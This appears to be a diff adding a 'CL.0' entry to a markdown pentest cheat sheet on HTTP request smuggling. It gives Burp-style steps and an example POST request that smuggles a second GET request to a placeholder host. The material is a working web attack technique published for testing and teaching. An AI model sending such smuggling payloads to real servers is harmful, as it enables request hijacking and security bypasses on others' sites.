@@ -866,3 +866,22 @@ X: X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
 ```
+
+## CL.0
+Front-end server reads request normally, but back-end server doesn't expect a request with body, so it doesn't read the `Content-Length` header and skips the body of the request.
+1. Create one tab containing the setup request and another containing an arbitrary follow-up request.
+2. Add the two tabs to a group in the correct order.
+3. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
+4. Change the Connection header to keep-alive.
+5. Send the sequence and check the responses.
+
+```
+POST /vulnerable-endpoint HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
